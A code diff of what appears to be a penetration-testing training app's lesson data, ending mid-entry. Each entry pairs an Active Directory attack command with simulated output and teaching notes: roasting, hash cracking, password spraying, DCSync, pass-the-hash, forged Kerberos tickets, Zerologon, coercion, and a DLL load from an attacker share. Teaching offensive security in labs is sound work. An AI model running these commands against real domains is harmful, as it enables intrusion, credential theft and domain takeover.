-      teach: 'MS17-010 (EternalBlue) is unauthenticated SMBv1 remote code execution as SYSTEM. If the scan says VULNERABLE, it is often the whole box in one shot — but confirm the target is a real lab host, not a honeypot, before you fire.',
+      signal: 'SMB   10.10.10.10  445  DC01  [*] Windows Server 2019 Build 17763 (name:DC01) (domain:acme.internal)',
+      teach: 'nxc against LDAP names the host (DC01) and the domain (acme.internal) and gives the base DN — the three facts every later AD command needs. Kerberos (88) + LDAP (389) + SMB (445) on one host is the fingerprint of a Domain Controller.',
     },
-    'gpp-passwords': {
+    'ad-anon-ldap-enum': {
+      cmd: "nxc ldap 10.10.10.10 -u '' -p '' --users", tool: 'nxc',
       output: [
-        'Groups.xml:',
-        '  <Properties userName="svc_admin"',
-        '    cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdQ"/>',
-        '$ gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdQ',
-        'Password123',
+        'LDAP  10.10.10.10  389  DC01  [*] Enumerated domain users',
+        'LDAP  10.10.10.10  389  DC01  Administrator',
+        'LDAP  10.10.10.10  389  DC01  tgibson',
+        'LDAP  10.10.10.10  389  DC01  jbloggs',
+        'LDAP  10.10.10.10  389  DC01  svc_sql',
       ].join('\n'),
-      signal: 'Password123',
-      teach: 'Group Policy Preferences stored passwords in SYSVOL encrypted with a key Microsoft published. Any domain user can read `Groups.xml` and decrypt the `cpassword` — a free set of working credentials.',
+      signal: 'LDAP  10.10.10.10  389  DC01  tgibson',
+      teach: 'If anonymous LDAP bind is allowed, you can list every domain user with no credentials at all. That user list is the raw material for AS-REP roasting and password spraying — the two no-creds ways into the domain.',
     },
-    'lateral-exec': {
+    'ad-user-enum': {
+      cmd: 'kerbrute userenum --dc 10.10.10.10 -d acme.internal users.txt', tool: 'kerbrute',
       output: [
-        'SMB    10.10.10.20   445  WEB01   [+] CORP\\svc_admin:Password123 (Pwn3d!)',
-        'SMB    10.10.10.20   445  WEB01   [+] Executed command via wmiexec',
-        'SMB    10.10.10.20   445  WEB01   nt authority\\system',
+        '2026/09/17 10:41:02 >  Using KDC(s): 10.10.10.10:88',
+        '2026/09/17 10:41:03 >  [+] VALID USERNAME: tgibson@acme.internal',
+        '2026/09/17 10:41:03 >  [+] VALID USERNAME: jbloggs@acme.internal',
+        '2026/09/17 10:41:05 >  Done! Tested 48 usernames (2 valid) in 2.8s',
       ].join('\n'),
-      signal: 'SMB    10.10.10.20   445  WEB01   [+] CORP\\svc_admin:Password123 (Pwn3d!)',
-      teach: 'Once a credential is local admin somewhere, "Pwn3d!" marks every host it owns. Spraying the cred across the subnet maps your lateral movement — each Pwn3d! box is a new shell and new loot.',
+      signal: '2026/09/17 10:41:03 >  [+] VALID USERNAME: tgibson@acme.internal',
+      teach: 'kerbrute asks the KDC (port 88) whether each username exists — valid names get a different Kerberos error than bad ones, and it never submits a password, so it does not lock accounts. A confirmed list feeds roasting and spraying.',
     },
-    'trust-enum': {
+    'asrep-roast': {
+      cmd: "nxc ldap 10.10.10.10 -u users.txt -p '' --asreproast asrep.hash", tool: 'nxc',
       output: [
-        'List of domain trusts:',
-        '    0: CORP corp.local (NT 5) (Forest Tree Root) (Primary Domain)',
-        '    1: DEV dev.corp.local (NT 5) (Direct Outbound)',
-        'The command completed successfully',
+        'LDAP  10.10.10.10  389  DC01  [+] tgibson has UF_DONT_REQUIRE_PREAUTH set',
+        '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7...e1f9:9c2d...8b',
       ].join('\n'),
-      signal: '1: DEV dev.corp.local (NT 5) (Direct Outbound)',
-      teach: 'Domains rarely stand alone. A trust to `dev.corp.local` means credentials or tickets from one domain may reach the other — the path to the goal sometimes runs through a trusted domain, not the one you landed in.',
+      signal: '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7...e1f9:9c2d...8b',
+      teach: 'An account with pre-auth disabled (UF_DONT_REQUIRE_PREAUTH) hands out an AS-REP encrypted with its password hash to anyone who asks — no credentials needed. Capture that $krb5asrep$ hash and crack it offline.',
     },
-
-    // ==================== CREDENTIALS & CRACKING ====================
-    'responder-poison': {
+    'crack-asrep': {
+      cmd: 'hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
       output: [
-        '[*] [LLMNR]  Poisoned answer sent to 10.10.10.50 for name fileshare',
-        '[SMB] NTLMv2-SSP Client   : 10.10.10.50',
-        '[SMB] NTLMv2-SSP Username : CORP\\jdoe',
-        '[SMB] NTLMv2-SSP Hash     : jdoe::CORP:1122...:A1B2...',
-      ].join('\n'),
-      signal: '[SMB] NTLMv2-SSP Username : CORP\\jdoe',
-      teach: 'When a Windows host mistypes a share name, it broadcasts asking "who is fileshare?". Responder answers "me", and the victim sends its NetNTLMv2 hash. You now have a hash to crack or relay — no exploit, just a protocol default.',
-    },
-    'crack-kerberoast': {
-      output: [
-        '$krb5tgs$23$*svc_sql$CORP.LOCAL$...:3f2a... : Summer2024!',
-        'Session..........: hashcat',
+        '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7...e1f9:9c2d...8b:Autumn2026!',
         'Status...........: Cracked',
       ].join('\n'),
       signal: 'Status...........: Cracked',
-      teach: 'A Kerberoast ticket (mode 13100) is encrypted with the service account\'s password hash, so you can crack it offline at full speed. "Cracked" means you now hold that account\'s cleartext password.',
+      teach: 'The AS-REP hash (mode 18200) is encrypted with the user\'s password, so it cracks offline at full GPU speed with no lockout. "Cracked" means you now hold tgibson\'s real password — a foothold credential in the domain.',
     },
-    'crack-netntlmv2': {
+    'gpp-passwords': {
+      cmd: "smbclient '//10.10.10.10/SYSVOL' -N -c 'recurse; ls'", tool: 'smbclient',
       output: [
-        'JDOE::CORP:1122334455667788:A1B2...:0101... : Winter2024!',
+        '\\acme.internal\\Policies\\{31B2F340-...}\\MACHINE\\Preferences\\Groups\\Groups.xml',
+        '  userName="svc_admin"',
+        '  cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdQ"',
+      ].join('\n'),
+      signal: '  cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdQ"',
+      teach: 'Group Policy Preferences stored passwords in SYSVOL encrypted with a key Microsoft published. Any domain user can read Groups.xml and decrypt the cpassword with gpp-decrypt — a free set of working credentials.',
+    },
+    'smb-share-inventory': {
+      cmd: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M spider_plus", tool: 'nxc',
+      output: [
+        'SMB  10.10.10.10  445  FILE01  [+] acme.internal\\jbloggs:Autumn2026!',
+        'SPIDER_PLUS  Finance\\Payroll\\Q4-2023-summary.xlsx (18 KB)',
+        'SPIDER_PLUS  IT\\scripts\\deploy.ps1 (contains a password)',
+      ].join('\n'),
+      signal: 'SPIDER_PLUS  IT\\scripts\\deploy.ps1 (contains a password)',
+      teach: 'With any valid credential, spider_plus walks every readable share and lists interesting files. Scripts, spreadsheets, and configs on file shares routinely contain the next credential — loot the shares before you do anything loud.',
+    },
+    'kerberoast': {
+      cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --kerberoasting tgs.hash", tool: 'nxc',
+      output: [
+        'LDAP  10.10.10.10  389  DC01  [+] Found SPN: MSSQLSvc/db01.acme.internal (svc_sql)',
+        '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc*...:3f2a...:9d8c...',
+      ].join('\n'),
+      signal: '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc*...:3f2a...:9d8c...',
+      teach: 'Any authenticated user can request a service ticket for an account that has an SPN. That ticket is encrypted with the service account\'s password hash, so you crack it offline. Service accounts often have weak, rarely-rotated passwords.',
+    },
+    'crack-tgs': {
+      cmd: 'hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
+      output: [
+        '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc*...:3f2a...:9d8c...:P@ssw0rd2023',
         'Status...........: Cracked',
       ].join('\n'),
-      signal: 'JDOE::CORP:1122334455667788:A1B2...:0101... : Winter2024!',
-      teach: 'The NetNTLMv2 hash Responder captured cracks offline in hashcat mode 5600. Recover the password and the captured hash becomes a real login you can use anywhere that account is valid.',
+      signal: 'Status...........: Cracked',
+      teach: 'A Kerberoasted service ticket (mode 13100) cracks offline — the DC never sees your guesses, so there is no lockout. "Cracked" means you now hold svc_sql\'s cleartext password, often a path to a database or a privileged service.',
     },
-    'online-brute-ssh': {
+    'password-spray': {
+      cmd: "nxc smb 10.10.10.10 -u users.txt -p 'Autumn2026!' --continue-on-success", tool: 'nxc',
       output: [
-        '[DATA] attacking ssh://10.10.10.10:22/',
-        '[22][ssh] host: 10.10.10.10   login: bob   password: iloveyou',
-        '1 of 1 target successfully completed, 1 valid password found',
+        'SMB  10.10.10.10  445  DC01  [-] acme.internal\\Administrator:Autumn2026! STATUS_LOGON_FAILURE',
+        'SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026! ',
       ].join('\n'),
-      signal: '[22][ssh] host: 10.10.10.10   login: bob   password: iloveyou',
-      teach: 'When you have a real username but no password, an online brute against SSH can find a weak one. Keep the wordlist small and the rate sane — lab accounts lock out too, and a found pair is an instant shell.',
+      signal: 'SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026! ',
+      teach: 'Spraying tries ONE password across many users (never many passwords at one user — that locks accounts). One seasonal guess often lands a valid login, as it did for jbloggs. Always check the lockout policy (--pass-pol) first.',
+    },
+    'bloodhound-collect': {
+      cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --bloodhound -c All --dns-server 10.10.10.10", tool: 'nxc',
+      output: [
+        'LDAP  10.10.10.10  389  DC01  [+] Collected 142 users, 38 groups, 12 computers',
+        'LDAP  10.10.10.10  389  DC01  [*] Compressed data written to acme_bloodhound.zip',
+      ].join('\n'),
+      signal: 'LDAP  10.10.10.10  389  DC01  [*] Compressed data written to acme_bloodhound.zip',
+      teach: 'BloodHound collection pulls the whole directory — users, groups, ACLs, sessions — into a zip you import into the BloodHound UI. There you ask "shortest path to Domain Admins" and it draws the attack chain for you. Collect first, analyse second.',
+    },
+    'adcs-esc': {
+      cmd: "certipy find -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -vulnerable", tool: 'certipy',
+      output: [
+        'Certificate Templates',
+        '  Template Name            : UserEnroll',
+        '  Enrollment Rights        : ACME\\Domain Users',
+        '  [!] Vulnerabilities      : ESC1 - Enrollee supplies subject + client auth',
+      ].join('\n'),
+      signal: '  [!] Vulnerabilities      : ESC1 - Enrollee supplies subject + client auth',
+      teach: 'A misconfigured certificate template (ESC1) lets any user request a cert as anyone — including a Domain Admin. certipy finds it; the Vulnerabilities line is your path. AD CS is a frequent, high-impact domain-takeover route.',
+    },
+    'cert-authenticate': {
+      cmd: 'certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10', tool: 'certipy',
+      output: [
+        '[*] Using principal: administrator@acme.internal',
+        '[*] Trying to get TGT...',
+        '[+] Got hash for administrator@acme.internal: aad3b...:31d6cfe0d16...',
+      ].join('\n'),
+      signal: '[+] Got hash for administrator@acme.internal: aad3b...:31d6cfe0d16...',
+      teach: 'A certificate you obtained (via ESC1, Shadow Credentials, etc.) authenticates over PKINIT and hands back the account\'s NT hash. From there you pass-the-hash — the certificate was just the key that unlocked the credential.',
+    },
+    'lateral-exec': {
+      cmd: "nxc smb 10.10.10.20 -u svc_admin -p 'Password123'", tool: 'nxc',
+      output: [
+        'SMB  10.10.10.20  445  WEB01  [*] Windows Server 2019 (name:WEB01) (domain:acme.internal)',
+        'SMB  10.10.10.20  445  WEB01  [+] acme.internal\\svc_admin:Password123 (Pwn3d!)',
+      ].join('\n'),
+      signal: 'SMB  10.10.10.20  445  WEB01  [+] acme.internal\\svc_admin:Password123 (Pwn3d!)',
+      teach: '"Pwn3d!" marks every host where a credential is local admin. Spraying a working cred across the subnet maps your lateral movement — each Pwn3d! box is a new shell (via nxc -x, psexec, or evil-winrm) and new loot.',
+    },
+    'ad-path-manual': {
+      cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --admin-count", tool: 'nxc',
+      output: [
+        'LDAP  10.10.10.10  389  DC01  [*] Accounts with adminCount=1 (protected / privileged)',
+        'LDAP  10.10.10.10  389  DC01  Administrator',
+        'LDAP  10.10.10.10  389  DC01  svc_backup  (member of Backup Operators)',
+      ].join('\n'),
+      signal: 'LDAP  10.10.10.10  389  DC01  svc_backup  (member of Backup Operators)',
+      teach: 'When you cannot run BloodHound, you can still find privileged targets by hand — adminCount=1 flags protected accounts. svc_backup in Backup Operators can read the SAM/NTDS, a direct privilege path worth chasing.',
+    },
+    'dump-secrets': {
+      cmd: "nxc smb 10.10.10.10 -u administrator -p 'P@ss' --sam", tool: 'nxc',
+      output: [
+        'SMB  10.10.10.10  445  DC01  [+] Dumping SAM hashes',
+        'Administrator:500:aad3b435b51404ee...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
+        'svc-backup:1104:aad3b435b51404ee...:7c6a180b36896a0a8c02787eeafb0e4c:::',
+      ].join('\n'),
+      signal: 'Administrator:500:aad3b435b51404ee...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
+      teach: 'With local admin you can dump the SAM — the local account hashes. The :500 Administrator hash can be passed to other machines (local admins are often reused), and the rest feed cracking. On a DC, --ntds dumps the whole domain.',
+    },
+    'dcsync': {
+      cmd: "impacket-secretsdump 'acme.internal/svc_backup:P@ss'@10.10.10.10 -just-dc", tool: 'impacket-secretsdump',
+      output: [
+        '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)',
+        'acme.internal\\Administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
+        'acme.internal\\krbtgt:502:aad3b...:1a59bd44fdb8f9f4a3f8c9d2e5b7a6c1:::',
+      ].join('\n'),
+      signal: 'acme.internal\\krbtgt:502:aad3b...:1a59bd44fdb8f9f4a3f8c9d2e5b7a6c1:::',
+      teach: 'DCSync asks the DC to replicate password data — it needs replication rights (Domain Admin, or a delegated edge). It returns every hash in the domain, including krbtgt (the key to forge golden tickets). This is total domain compromise.',
+    },
+    'own-domain-pth': {
+      cmd: 'nxc smb 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x whoami', tool: 'nxc',
+      output: [
+        'SMB  10.10.10.10  445  DC01  [+] acme.internal\\administrator:31d6... (Pwn3d!)',
+        'SMB  10.10.10.10  445  DC01  [+] Executed command',
+        'SMB  10.10.10.10  445  DC01  nt authority\\system',
+      ].join('\n'),
+      signal: 'SMB  10.10.10.10  445  DC01  nt authority\\system',
+      teach: 'You never need to crack the Administrator hash — you pass it. nxc -H authenticates with the NT hash directly and runs a command; "nt authority\\system" confirms you own the box. This is the payoff of dumping or DCSyncing the hash.',
+    },
+    'shadow-credentials': {
+      cmd: 'pywhisker.py -d acme.internal -u jbloggs -p Autumn2026! --target svc_app --action add', tool: 'pywhisker',
+      output: [
+        '[*] Adding Key Credential to msDS-KeyCredentialLink of svc_app',
+        '[+] Saved PFX (#PKCS12) to svc_app.pfx (password: a1b2c3)',
+      ].join('\n'),
+      signal: '[+] Saved PFX (#PKCS12) to svc_app.pfx (password: a1b2c3)',
+      teach: 'Shadow Credentials abuses write access to an account\'s msDS-KeyCredentialLink: you add your own certificate, then authenticate as the account via PKINIT (certipy auth) to recover its NT hash. A quiet alternative to resetting a password.',
+    },
+    'golden-ticket': {
+      cmd: 'impacket-ticketer -nthash 1a59bd44... -domain-sid S-1-5-21-... -domain acme.internal administrator', tool: 'impacket-ticketer',
+      output: [
+        '[*] Creating basic skeleton ticket and PAC Infos',
+        '[*] Customizing ticket for acme.internal/administrator',
+        '[+] Saving ticket in administrator.ccache',
+      ].join('\n'),
+      signal: '[+] Saving ticket in administrator.ccache',
+      teach: 'With the krbtgt hash you forge a TGT for any user, valid until krbtgt is rotated twice — the ultimate persistence. This is a post-compromise move: you already own the domain, and the golden ticket keeps you in.',
+    },
+    'trust-enum': {
+      cmd: 'nltest /domain_trusts', tool: 'nltest',
+      output: [
+        'List of domain trusts:',
+        '  0: ACME acme.internal (NT 5) (Forest Tree Root) (Primary Domain)',
+        '  1: DEV dev.acme.internal (NT 5) (Direct Outbound)',
+        'The command completed successfully',
+      ].join('\n'),
+      signal: '  1: DEV dev.acme.internal (NT 5) (Direct Outbound)',
+      teach: 'Domains rarely stand alone. A trust to dev.acme.internal means credentials or tickets from one domain may reach the other — the path to the goal sometimes runs through a trusted domain, not the one you landed in.',
+    },
+    'zerologon-check': {
+      cmd: 'zerologon-scan DC01 10.10.10.10', tool: 'zerologon-scan',
+      output: [
+        'Performing authentication attempts...',
+        '==============================',
+        'Success! DC01 is vulnerable to Zerologon (CVE-2020-1472).',
+      ].join('\n'),
+      signal: 'Success! DC01 is vulnerable to Zerologon (CVE-2020-1472).',
+      teach: 'Zerologon checks whether a DC accepts an all-zero challenge to reset its own machine password. The check is safe; the exploit is NOT — it breaks the DC\'s secure channel and must be restored afterward. Confirm it is a lab you own before going further.',
+    },
+    'wsus-abuse': {
+      cmd: 'reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer', tool: 'reg',
+      output: [
+        '    WUServer    REG_SZ    http://wsus.acme.internal:8530',
+        '# served over HTTP, not HTTPS',
+      ].join('\n'),
+      signal: '    WUServer    REG_SZ    http://wsus.acme.internal:8530',
+      teach: 'WSUS served over plain HTTP lets an attacker who can approve updates push a signed Microsoft binary with attacker-chosen arguments to clients — running as SYSTEM. An internal patch server is a high-value, often-overlooked target.',
+    },
+    'sccm-enum': {
+      cmd: "sccmhunter find -u jbloggs -p 'Autumn2026!' -d acme.internal -dc-ip 10.10.10.10", tool: 'sccmhunter',
+      output: [
+        '[+] Management Point found: MP01.acme.internal',
+        '[+] Network Access Account retrievable from policy',
+        'ACME\\svc_naa : NAA-P@ssw0rd',
+      ].join('\n'),
+      signal: 'ACME\\svc_naa : NAA-P@ssw0rd',
+      teach: 'SCCM/MECM stores Network Access Account credentials that clients can retrieve — frequently over-privileged and reusable across the domain. Enumerating the management point often hands you a working service credential outright.',
+    },
+    'nxc-arsenal': {
+      cmd: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' --shares --users --pass-pol", tool: 'nxc',
+      output: [
+        'SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026!',
+        'SMB  10.10.10.10  445  DC01  [*] Minimum password length: 7',
+        'SMB  10.10.10.10  445  DC01  Share       Permissions',
+        'SMB  10.10.10.10  445  DC01  Finance     READ,WRITE',
+      ].join('\n'),
+      signal: 'SMB  10.10.10.10  445  DC01  Finance     READ,WRITE',
+      teach: 'NetExec (nxc) is the swiss-army knife of AD: one credential, and it enumerates shares, users, and the password policy in a single run, then can execute modules. A WRITE share is a place to drop a payload or capture a hash.',
+    },
+    'kerberos-tickets': {
+      cmd: 'sudo ntpdate -u 10.10.10.10', tool: 'ntpdate',
+      output: [
+        '# before: nxc ldap ... -> KRB_AP_ERR_SKEW (clock skew too great)',
+        '2026-09-17 10:41:07.882  ntpdate[4120]: step time server 10.10.10.10 offset +312.004s',
+      ].join('\n'),
+      signal: '2026-09-17 10:41:07.882  ntpdate[4120]: step time server 10.10.10.10 offset +312.004s',
+      teach: 'Kerberos refuses tickets when your clock differs from the DC by more than 5 minutes — "KRB_AP_ERR_SKEW". It is the single most common reason an AD attack "mysteriously" fails. Sync your clock to the DC with ntpdate and retry.',
+    },
+    'bloodyad-acl': {
+      cmd: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' set password svc_backup NewP@ss123!", tool: 'bloodyAD',
+      output: [
+        '[+] Password changed successfully for svc_backup',
+      ].join('\n'),
+      signal: '[+] Password changed successfully for svc_backup',
+      teach: 'An ACL edge like GenericAll is abstract until you use it. bloodyAD turns "I have rights over this account" into "I just set its password" — a concrete takeover. Each edge BloodHound draws is an action like this one.',
+    },
+    'gmsa-read': {
+      cmd: "bloodyAD --host 10.10.10.10 -d acme.internal -u jbloggs -p 'Autumn2026!' get object 'svc_app$' --attr msDS-ManagedPassword", tool: 'bloodyAD',
+      output: [
+        'distinguishedName: CN=svc_app,CN=Managed Service Accounts,DC=acme,DC=internal',
+        'msDS-ManagedPassword.NTLM: 5f4dcc3b5aa765d61d8327deb882cf99',
+      ].join('\n'),
+      signal: 'msDS-ManagedPassword.NTLM: 5f4dcc3b5aa765d61d8327deb882cf99',
+      teach: 'A gMSA\'s password is managed by AD and readable only by principals on its allow-list. When your account is on that list, you recover the NT hash directly — no cracking — and can pass it. gMSAs are often over-privileged service identities.',
+    },
+    'laps-read': {
+      cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M laps", tool: 'nxc',
+      output: [
+        'LDAP  10.10.10.10  389  DC01  [+] LAPS passwords readable by jbloggs',
+        'LAPS  Computer:WS01$  Password:Hb7!xQ2m...k9',
+      ].join('\n'),
+      signal: 'LAPS  Computer:WS01$  Password:Hb7!xQ2m...k9',
+      teach: 'LAPS randomises the local Administrator password per machine — good security, unless your account can read the ms-Mcs-AdmPwd attribute. If you can read it, you have local admin on that host, handed over in cleartext.',
+    },
+    'ticket-reuse': {
+      cmd: 'export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass administrator@dc01.acme.internal', tool: 'impacket-psexec',
+      output: [
+        '[*] Requesting shares on dc01.acme.internal.....',
+        '[*] Found writable share ADMIN$',
+        '[!] Launching semi-interactive shell',
+        'nt authority\\system',
+      ].join('\n'),
+      signal: 'nt authority\\system',
+      teach: 'Pass-the-Ticket loads a stolen or forged Kerberos ticket (a .ccache) into your session via KRB5CCNAME — no password needed. Every tool that speaks Kerberos then acts as that user; here psexec lands a SYSTEM shell.',
+    },
+    'powerview-enum': {
+      cmd: 'powershell -ep bypass -c "Find-InterestingDomainAcl -ResolveGUIDs"', tool: 'powershell',
+      output: [
+        'IdentityReferenceName  : jbloggs',
+        'ActiveDirectoryRights  : GenericAll',
+        'ObjectDN               : CN=Helpdesk Admins,OU=Groups,DC=acme,DC=internal',
+      ].join('\n'),
+      signal: 'ActiveDirectoryRights  : GenericAll',
+      teach: 'PowerView turns a Windows foothold into a map of the domain. A GenericAll ACL over a group is a takeover edge — you can add yourself to it. This is the same data BloodHound uses, gathered by hand from the box.',
+    },
+    'ad-legacy-enum': {
+      cmd: 'net group "Domain Admins" /domain', tool: 'net',
+      output: [
+        'Group name     Domain Admins',
+        'Members',
+        '-------------------------------------------------------------------------------',
+        'Administrator            backupadmin',
+      ].join('\n'),
+      signal: 'Administrator            backupadmin',
+      teach: 'Every Windows box ships with net and nltest. They are noisy but always present — when you land with no tools, these built-ins still list users, groups, and Domain Admins. backupadmin in Domain Admins is a target worth pursuing.',
+    },
+    'ad-psdotnet-enum': {
+      cmd: 'powershell -ep bypass -c "([ADSISearcher]\'(servicePrincipalName=*)\').FindAll()"', tool: 'powershell',
+      output: [
+        'Path: LDAP://CN=svc_sql,OU=Services,DC=acme,DC=internal',
+        'Properties: samaccountname={svc_sql} serviceprincipalname={MSSQLSvc/db01}',
+      ].join('\n'),
+      signal: 'Path: LDAP://CN=svc_sql,OU=Services,DC=acme,DC=internal',
+      teach: 'When PowerView is blocked, raw .NET ADSI queries enumerate the domain with nothing but built-in PowerShell — no upload. An account with an SPN (svc_sql) is kerberoastable. Living off the land this way sidesteps AV that flags known tooling.',
+    },
+    'ad-acl-abuse': {
+      cmd: 'net group "Helpdesk Admins" jbloggs /add /domain', tool: 'net',
+      output: [
+        'The command completed successfully.',
+      ].join('\n'),
+      signal: 'The command completed successfully.',
+      teach: 'When you hold GenericAll (or AddMember) over a group, you simply add yourself to it — the ACL edge becomes membership, and membership becomes its privileges. Walk the BloodHound path one edge at a time until it reaches Domain Admin or DCSync.',
+    },
+    'zerologon-exploit': {
+      cmd: 'python3 set_empty_pw.py DC01 10.10.10.10', tool: 'sh',
+      output: [
+        '[*] Resetting DC01$ machine account password to empty',
+        '[+] Success! You can now DCSync with -no-pass',
+        '[!] Remember to restore the original password afterward',
+      ].join('\n'),
+      signal: '[+] Success! You can now DCSync with -no-pass',
+      teach: 'Zerologon zeroes the DC\'s machine password, letting you DCSync the whole domain. It also breaks the DC until you restore the original password from the local SAM — so the restore step is mandatory. Lab-only, high-risk.',
+    },
+    'coerce-auth': {
+      cmd: "coercer coerce -t 10.10.10.10 -l 10.10.14.5 -u jbloggs -p 'Autumn2026!' -d acme.internal", tool: 'coercer',
+      output: [
+        '[+] (PetitPotam) EfsRpcOpenFileRaw triggered',
+        '[+] Target 10.10.10.10 authenticated to 10.10.14.5',
+        '[SMB] NTLMv2-SSP Username : ACME\\DC01$',
+      ].join('\n'),
+      signal: '[SMB] NTLMv2-SSP Username : ACME\\DC01$',
+      teach: 'Coercion tricks a target — often a DC — into authenticating to you (PetitPotam, PrinterBug). The machine-account hash you catch (DC01$) can be relayed to AD CS or LDAP for escalation. The DC authenticating to you is the whole point.',
+    },
+    'unconstrained-delegation': {
+      cmd: 'Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap', tool: 'rubeus',
+      output: [
+        '[*] Monitoring every 5 seconds for new TGTs',
+        '[+] Found new TGT: User:DC01$@ACME.INTERNAL',
+        '[*] Base64EncodedTicket: doIF...',
+      ].join('\n'),
+      signal: '[+] Found new TGT: User:DC01$@ACME.INTERNAL',
+      teach: 'A host with unconstrained delegation caches the TGT of everyone who authenticates to it. Combine it with coercion to make a DC connect, capture DC01$\'s TGT, and you can DCSync. Watching for the DC\'s ticket is the goal.',
+    },
+    'silver-ticket': {
+      cmd: 'impacket-ticketer -nthash <svc_hash> -domain-sid S-1-5-21-... -domain acme.internal -spn cifs/file01 administrator', tool: 'impacket-ticketer',
+      output: [
+        '[*] Creating basic skeleton ticket and PAC Infos',
+        '[*] Customizing ticket for CIFS/file01.acme.internal',
+        '[+] Saving ticket in administrator.ccache',
+      ].join('\n'),
+      signal: '[+] Saving ticket in administrator.ccache',
+      teach: 'A silver ticket forges a service ticket using one service account\'s hash — scoped to that one service, but it never touches the DC, so it is quiet. Narrower than a golden ticket, and useful when all you have is a single service hash.',
+    },
+    'diamond-ticket': {
+      cmd: 'Rubeus.exe diamond /krbkey:<aes256> /user:jbloggs /password:Autumn2026! /ticketuser:administrator /domain:acme.internal', tool: 'rubeus',
+      output: [
+        '[*] Requesting a legitimate TGT for jbloggs',
+        '[*] Decrypting with the krbtgt key and modifying the PAC -> administrator',
+        '[+] Saving diamond ticket to administrator.ccache',
+      ].join('\n'),
+      signal: '[+] Saving diamond ticket to administrator.ccache',
+      teach: 'A diamond ticket modifies a real TGT instead of forging one from scratch (a golden ticket), so its details match a genuine request and look less anomalous. Both need the krbtgt key — this is a stealthier flavour of the same post-DA persistence.',
+    },
+    'gpo-abuse': {
+      cmd: "pygpoabuse.py acme.internal/jbloggs:'Autumn2026!' -gpo-id <GUID> -command \"net localgroup administrators jbloggs /add\"", tool: 'pygpoabuse',
+      output: [
+        '[+] Version updated for GPO {31B2F340-...}',
+        '[+] Scheduled task created; runs as SYSTEM on linked hosts at next gpupdate',
+      ].join('\n'),
+      signal: '[+] Scheduled task created; runs as SYSTEM on linked hosts at next gpupdate',
+      teach: 'Write access to a Group Policy Object lets you push a scheduled task to every computer the GPO is linked to — code execution as SYSTEM across an OU. A single misassigned GPO permission can escalate to a whole fleet of machines.',
+    },
+    'dnsadmins-abuse': {
+      cmd: 'nxc smb 10.10.10.10 -u svc_dns -p P@ss -x "reg add ...\\DNS\\Parameters /v ServerLevelPluginDll /d \\\\10.10.14.5\\share\\dns.dll"', tool: 'nxc',
+      output: [
+        'SMB  10.10.10.10  445  DC01  [+] Executed command',
+        'SMB  10.10.10.10  445  DC01  The operation completed successfully.',
+        '# after: sc.exe stop dns & sc.exe start dns -> DLL runs as SYSTEM',
+      ].join('\n'),
+      signal: 'SMB  10.10.10.10  445  DC01  The operation completed successfully.',
+      teach: 'The DnsAdmins group can tell the DNS service (often on a DC) to load an arbitrary DLL, which then runs as SYSTEM. It needs a service restart, so it is noisy — but membership in DnsAdmins is a direct line to owning the DC.',
+    },
+    'sid-history-abuse': {
+      cmd: 'impacket-ticketer -nthash <krbtgt> -domain-sid S-1-5-21-... -domain acme.internal -extra-sid S-1-5-21-ROOT-519 administrator', tool: 'impacket-ticketer',
+      output: [
+        '[*] Creating golden ticket with extra SID (Enterprise Admins)',
+        '[+] Saving ticket in administrator.ccache',
+        '[*] Cross-domain access via SID History granted',
+      ].join('\n'),
+      signal: '[*] Cross-domain access via SID History granted',
+      teach: 'SID History lets a principal carry privileged SIDs from another domain — legitimately used in migrations, abused to smuggle Enterprise Admin rights across a trust. It is how a single-domain compromise becomes forest-wide.',
+    },
+    'eternalblue': {
+      cmd: 'nmap -p445 --script smb-vuln-ms17-010 -oN scans/ms17010.txt 10.10.10.10', tool: 'nmap',
+      output: [
+        'Host script results:',
+        '| smb-vuln-ms17-010:',
+        '|   VULNERABLE: Remote Code Execution in SMBv1 (ms17-010)',
+        '|_    State: VULNERABLE',
+      ].join('\n'),
+      signal: '|_    State: VULNERABLE',
+      teach: 'MS17-010 (EternalBlue) is unauthenticated SMBv1 remote code execution as SYSTEM. If the scan says VULNERABLE, it is often the whole box in one shot — but confirm the target is a real lab host, not a honeypot, before you fire the exploit.',
+    },
+    'nopac': {
+      cmd: "noPac.py acme.internal/jbloggs:'Autumn2026!' -dc-ip 10.10.10.10 -dump", tool: 'noPac.py',
+      output: [
